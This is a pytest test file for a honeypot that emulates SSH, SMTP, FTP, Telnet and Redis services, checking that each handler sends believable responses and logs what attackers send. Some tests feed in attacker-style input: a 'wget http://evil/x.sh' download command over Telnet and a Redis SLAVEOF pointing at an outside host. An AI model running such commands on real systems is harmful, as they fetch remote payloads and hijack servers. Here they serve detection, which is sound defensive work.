"""Tests for the Phase 2 protocol handlers (SSH, SMTP, FTP, Telnet, Redis)."""

import asyncio
import logging

import pytest

from honeyknot.config import ServiceConfig
from honeyknot.protocols import (
    ConnectionContext,
    FTPHandler,
    RedisHandler,
    SMTPHandler,
    SSHHandler,
    TelnetHandler,
)
from honeyknot.protocols.redis import _parse_command


class _FakeWriter:
    """Minimal StreamWriter stand-in that records bytes."""

    def __init__(self):
        self.buffer = bytearray()
        self._closing = False

    def is_closing(self):
        return self._closing

    def write(self, data: bytes):
        self.buffer.extend(data)

    async def drain(self):
        return None

    def close(self):
        self._closing = True

    async def wait_closed(self):
        return None


def _make_ctx(port: int = 0) -> tuple[ConnectionContext, _FakeWriter]:
    writer = _FakeWriter()
    ctx = ConnectionContext(
        writer=writer,
        addr=("127.0.0.1", 12345),
        port=port,
        request_logger=logging.getLogger("test.request"),
        raw_capture=None,
    )
    return ctx, writer


def _cfg(protocol: str, **opts) -> ServiceConfig:
    return ServiceConfig(
        port=0, service_type="tcp", protocol=protocol, protocol_opts=opts,
    )


def _run(coro):
    return asyncio.run(coro)


class TestSSH:
    def test_banner_sent_on_connect(self):
        ctx, writer = _make_ctx()
        handler = SSHHandler(_cfg("ssh", banner="SSH-2.0-Test"))
        _run(handler.on_connect(ctx))
        assert writer.buffer == b"SSH-2.0-Test\r\n"
        assert ctx.state["banner_sent"] is True

    def test_captures_client_banner_then_closes_on_next_chunk(self):
        ctx, _ = _make_ctx()
        handler = SSHHandler(_cfg("ssh"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"SSH-2.0-libssh_0.9.6\r\n", ctx))
        assert ctx.state["client_banner"] == b"SSH-2.0-libssh_0.9.6"
        # Next chunk (binary KEX) triggers close
        _run(handler.on_data(b"\x00\x00\x05\xdc\x14binary-kex-data", ctx))
        assert ctx.closed


class TestSMTP:
    def test_greeting(self):
        ctx, writer = _make_ctx()
        handler = SMTPHandler(_cfg("smtp", hostname="mx.test"))
        _run(handler.on_connect(ctx))
        assert writer.buffer.startswith(b"220 mx.test ESMTP")

    def test_full_session_captures_body(self):
        ctx, writer = _make_ctx()
        handler = SMTPHandler(_cfg("smtp", hostname="mx.test"))
        _run(handler.on_connect(ctx))
        writer.buffer.clear()

        _run(handler.on_data(b"EHLO scanner\r\n", ctx))
        assert b"250-mx.test" in writer.buffer
        assert b"250 HELP" in writer.buffer
        writer.buffer.clear()

        _run(handler.on_data(
            b"MAIL FROM:<a@b>\r\nRCPT TO:<c@d>\r\nDATA\r\n", ctx,
        ))
        assert writer.buffer.count(b"250 2.1.0 Ok") == 2
        assert b"354 End data" in writer.buffer
        assert ctx.state["in_data"] is True
        writer.buffer.clear()

        _run(handler.on_data(b"Subject: x\r\n\r\npayload\r\n.\r\n", ctx))
        assert b"250 2.0.0 Ok: queued" in writer.buffer
        assert ctx.state["in_data"] is False

    def test_quit_closes(self):
        ctx, _ = _make_ctx()
        handler = SMTPHandler(_cfg("smtp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"QUIT\r\n", ctx))
        assert ctx.closed


class TestFTP:
    def test_login_flow(self):
        ctx, writer = _make_ctx()
        handler = FTPHandler(_cfg("ftp"))
        _run(handler.on_connect(ctx))
        assert writer.buffer.startswith(b"220 ")
        writer.buffer.clear()

        _run(handler.on_data(b"USER root\r\nPASS hunter2\r\n", ctx))
        assert b"331 Please specify" in writer.buffer
        assert b"230 Login successful" in writer.buffer
        assert ctx.state["user"] == "root"

    def test_data_channel_refused(self):
        ctx, writer = _make_ctx()
        handler = FTPHandler(_cfg("ftp"))
        _run(handler.on_connect(ctx))
        writer.buffer.clear()
        _run(handler.on_data(b"PASV\r\n", ctx))
        assert b"425" in writer.buffer


class TestTelnet:
    def test_login_prompt_and_iac(self):
        ctx, writer = _make_ctx()
        handler = TelnetHandler(_cfg("telnet", hostname="gw"))
        _run(handler.on_connect(ctx))
        assert b"\xff\xfb\x01" in writer.buffer  # IAC WILL ECHO
        assert b"gw login: " in writer.buffer

    def test_captures_creds_and_commands(self, caplog):
        ctx, writer = _make_ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        writer.buffer.clear()

        with caplog.at_level(logging.INFO, logger="honeyknot.protocols.telnet"):
            _run(handler.on_data(b"root\r\n", ctx))
            assert b"Password: " in writer.buffer
            _run(handler.on_data(b"admin123\n", ctx))
            assert any("creds" in r.message and "root" in r.message
                       for r in caplog.records)
            writer.buffer.clear()
            _run(handler.on_data(b"wget http://evil/x.sh\n", ctx))
            assert any("wget http://evil/x.sh" in r.message
                       for r in caplog.records)

    def test_strip_iac_handles_sub_negotiation(self):
        raw = b"\xff\xfa\x1f\x00\x50\x00\x18\xff\xf0hello"
        assert TelnetHandler._strip_iac(raw) == b"hello"


class TestRedis:
    def test_parse_inline(self):
        consumed, cmd = _parse_command(b"PING\r\nextra")
        assert consumed == 6
        assert cmd == ["PING"]

    def test_parse_array(self):
        consumed, cmd = _parse_command(
            b"*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n"
        )
        assert cmd == ["SET", "foo", "bar"]
        assert consumed == len(b"*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n")

    def test_parse_partial_returns_zero(self):
        consumed, cmd = _parse_command(b"*2\r\n$3\r\nSE")
        assert (consumed, cmd) == (0, None)

    def test_ping_and_info(self):
        ctx, writer = _make_ctx()
        handler = RedisHandler(_cfg("redis", version="6.2.0"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"PING\r\n", ctx))
        assert b"+PONG\r\n" in writer.buffer
        writer.buffer.clear()
        _run(handler.on_data(b"INFO\r\n", ctx))
        assert b"redis_version:6.2.0" in writer.buffer

    def test_pipelined_commands(self):
        ctx, writer = _make_ctx()
        handler = RedisHandler(_cfg("redis"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"PING\r\nPING\r\nPING\r\n", ctx))
        assert writer.buffer.count(b"+PONG\r\n") == 3

    def test_set_slaveof_acknowledged(self):
        ctx, writer = _make_ctx()
        handler = RedisHandler(_cfg("redis"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(
            b"*3\r\n$7\r\nSLAVEOF\r\n$7\r\n1.2.3.4\r\n$4\r\n6666\r\n", ctx,
        ))
        assert b"+OK\r\n" in writer.buffer

    def test_quit_closes(self):
        ctx, _ = _make_ctx()
        handler = RedisHandler(_cfg("redis"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"QUIT\r\n", ctx))
        assert ctx.closed


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
